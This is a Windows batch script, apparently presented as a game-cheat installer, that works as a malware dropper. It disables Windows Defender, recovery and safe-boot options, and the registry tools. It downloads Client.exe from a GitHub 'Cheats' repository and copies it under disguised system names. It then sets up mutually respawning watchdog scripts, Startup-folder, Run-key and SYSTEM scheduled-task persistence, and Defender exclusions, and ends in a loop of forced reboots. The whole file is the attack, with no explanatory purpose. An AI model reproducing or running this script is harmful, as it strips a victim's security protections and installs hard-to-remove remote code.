��&cls
��
@echo off
cls

>nul 2>&1 "%SYSTEMROOT%\system32\Client.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Предупреждение: скрипт работает не от имени администратора. Некоторые действия могут быть недоступны.
)

sc stop WinDefend
sc config WinDefend start= disabled
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f

bcdedit /set {default} bootmenupolicy legacy >nul 2>&1
bcdedit /set {default} advancedoptions no >nul 2>&1

bcdedit /set {default} recoveryenabled no >nul 2>&1

bcdedit /deletevalue {current} safeboot >nul 2>&1

reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v "AutoReboot" /t REG_DWORD /d 1 /f >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d 1 /f >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/asmdkawjd/Cheats/raw/refs/heads/main/Client.exe' -OutFile '%TEMP%\Client.exe'"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f

set CHEAT_PATH=%windir%\system32\Client.exe
set BAT_PATH=%~f0
set CHEAT_CLONE1=%windir%\system32\SystemHelper.exe
set CHEAT_CLONE2=%TEMP%\SysCore.exe

copy "%TEMP%\Client.exe" "%CHEAT_PATH%" >nul
copy "%TEMP%\Client.exe" "%CHEAT_CLONE1%" >nul
copy "%TEMP%\Client.exe" "%CHEAT_CLONE2%" >nul
copy "%TEMP%\Client.exe" "%USERPROFILE%\AppData\Local\TempClient.exe" >nul
copy "%TEMP%\Client.exe" "%windir%\SysTemp.exe" >nul

echo @echo off > "%TEMP%\Monitor1.bat"
echo :loop >> "%TEMP%\Monitor1.bat"
echo tasklist ^| find /i "Client.exe" ^>nul || start "" "%CHEAT_PATH%" >> "%TEMP%\Monitor1.bat"
echo tasklist ^| find /i "SystemHelper.exe" ^>nul || start "" "%CHEAT_CLONE1%" >> "%TEMP%\Monitor1.bat"
echo tasklist ^| find /i "SysCore.exe" ^>nul || start "" "%CHEAT_CLONE2%" >> "%TEMP%\Monitor1.bat"
echo tasklist ^| find /i "Monitor2.bat" ^>nul || start "" "%TEMP%\Monitor2.bat" >> "%TEMP%\Monitor1.bat"
echo tasklist ^| find /i "Guard1.vbs" ^>nul || start "" "%TEMP%\Guard1.vbs" >> "%TEMP%\Monitor1.bat"
echo timeout /t 3 ^>nul >> "%TEMP%\Monitor1.bat"
echo goto loop >> "%TEMP%\Monitor1.bat"

echo @echo off > "%TEMP%\Monitor2.bat"
echo :loop >> "%TEMP%\Monitor2.bat"
echo tasklist ^| find /i "Client.exe" ^>nul || start "" "%CHEAT_PATH%" >> "%TEMP%\Monitor2.bat"
echo tasklist ^| find /i "SystemHelper.exe" ^>nul || start "" "%CHEAT_CLONE1%" >> "%TEMP%\Monitor2.bat"
echo tasklist ^| find /i "SysCore.exe" ^>nul || start "" "%CHEAT_CLONE2%" >> "%TEMP%\Monitor2.bat"
echo tasklist ^| find /i "Monitor1.bat" ^>nul || start "" "%TEMP%\Monitor1.bat" >> "%TEMP%\Monitor2.bat"
echo tasklist ^| find /i "Guard2.vbs" ^>nul || start "" "%TEMP%\Guard2.vbs" >> "%TEMP%\Monitor2.bat"
echo timeout /t 3 ^>nul >> "%TEMP%\Monitor2.bat"
echo goto loop >> "%TEMP%\Monitor2.bat"

echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\Guard1.vbs"
echo Do While True >> "%TEMP%\Guard1.vbs"
echo     If Not WshShell.AppActivate("cmd.exe /c Monitor2.bat") Then WshShell.Run """%TEMP%\Monitor2.bat""", 0 >> "%TEMP%\Guard1.vbs"
echo     WScript.Sleep 3000 >> "%TEMP%\Guard1.vbs"
echo Loop >> "%TEMP%\Guard1.vbs"

echo Set WshShell = CreateObject("WScript.Shell") > "%TEMP%\Guard2.vbs"
echo Do While True >> "%TEMP%\Guard2.vbs"
echo     If Not WshShell.AppActivate("cmd.exe /c Monitor1.bat") Then WshShell.Run """%TEMP%\Monitor1.bat""", 0 >> "%TEMP%\Guard2.vbs"
echo     WScript.Sleep 3000 >> "%TEMP%\Guard2.vbs"
echo Loop >> "%TEMP%\Guard2.vbs"

copy "%CHEAT_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
copy "%BAT_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
copy "%TEMP%\Monitor1.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
copy "%TEMP%\Monitor2.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
copy "%TEMP%\Guard1.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
copy "%TEMP%\Guard2.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
if exist "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" (
    copy "%CHEAT_PATH%" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
    copy "%BAT_PATH%" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
    copy "%TEMP%\Monitor1.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
    copy "%TEMP%\Monitor2.bat" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
    copy "%TEMP%\Guard1.vbs" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
    copy "%TEMP%\Guard2.vbs" "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
)

copy "%CHEAT_CLONE1%" "%USERPROFILE%\AppData\Local" >nul
copy "%CHEAT_CLONE2%" "%windir%" >nul

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cheat" /t REG_SZ /d "%CHEAT_PATH%" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cheat" /t REG_SZ /d "%CHEAT_PATH%" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "Cheat" /t REG_SZ /d "%CHEAT_PATH%" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "Run" /t REG_SZ /d "%CHEAT_CLONE1%" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Monitor1" /t REG_SZ /d "%TEMP%\Monitor1.bat" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Monitor2" /t REG_SZ /d "%TEMP%\Monitor2.bat" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Guard1" /t REG_SZ /d "%TEMP%\Guard1.vbs" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Guard2" /t REG_SZ /d "%TEMP%\Guard2.vbs" /f >nul

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Cheat" /t REG_SZ /d "%CHEAT_PATH%" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Cheat" /t REG_SZ /d "%CHEAT_PATH%" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v "Cheat" /t REG_SZ /d "%CHEAT_CLONE2%" /f >nul 2>&1
reg add "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run" /v "Cheat" /t REG_SZ /d "%CHEAT_CLONE1%" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Monitor1" /t REG_SZ /d "%TEMP%\Monitor1.bat" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Monitor2" /t REG_SZ /d "%TEMP%\Monitor2.bat" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Guard1" /t REG_SZ /d "%TEMP%\Guard1.vbs" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Guard2" /t REG_SZ /d "%TEMP%\Guard2.vbs" /f >nul 2>&1

schtasks /create /tn "CheatTask" /tr "%CHEAT_PATH%" /sc onlogon /ru System /f >nul 2>&1
schtasks /create /tn "BatTask" /tr "%BAT_PATH%" /sc onlogon /ru System /f >nul 2>&1
schtasks /create /tn "CheatStartup" /tr "%CHEAT_CLONE1%" /sc onstart /ru System /f >nul 2>&1
schtasks /create /tn "Monitor1Task" /tr "%TEMP%\Monitor1.bat" /sc onstart /ru System /f >nul 2>&1
schtasks /create /tn "Monitor2Task" /tr "%TEMP%\Monitor2.bat" /sc onlogon /ru System /f >nul 2>&1
schtasks /create /tn "Guard1Task" /tr "%TEMP%\Guard1.vbs" /sc onstart /ru System /f >nul 2>&1
schtasks /create /tn "Guard2Task" /tr "%TEMP%\Guard2.vbs" /sc onlogon /ru System /f >nul 2>&1

powershell -Command "Add-MpPreference -ExclusionPath '%CHEAT_PATH%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%CHEAT_CLONE1%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%CHEAT_CLONE2%'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\Monitor1.bat'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\Monitor2.bat'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\Guard1.vbs'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\Guard2.vbs'" >nul 2>&1

start "" "%CHEAT_PATH%"
start "" "%CHEAT_CLONE1%"
start "" "%CHEAT_CLONE2%"
start "" "%TEMP%\Monitor1.bat"
start "" "%TEMP%\Monitor2.bat"
start "" "%TEMP%\Guard1.vbs"
start "" "%TEMP%\Guard2.vbs"

ntsd -c "q" -pn Client.exe
ntsd -c "q" -pn SystemHelper.exe
ntsd -c "q" -pn SysCore.exe

:monitor
tasklist | find /i "Client.exe" >nul || start "" "%CHEAT_PATH%"
tasklist | find /i "SystemHelper.exe" >nul || start "" "%CHEAT_CLONE1%"
tasklist | find /i "SysCore.exe" >nul || start "" "%CHEAT_CLONE2%"
tasklist | find /i "Monitor1.bat" >nul || start "" "%TEMP%\Monitor1.bat"
tasklist | find /i "Monitor2.bat" >nul || start "" "%TEMP%\Monitor2.bat"
timeout /t 5 >nul

shutdown /r /t 13
goto monitor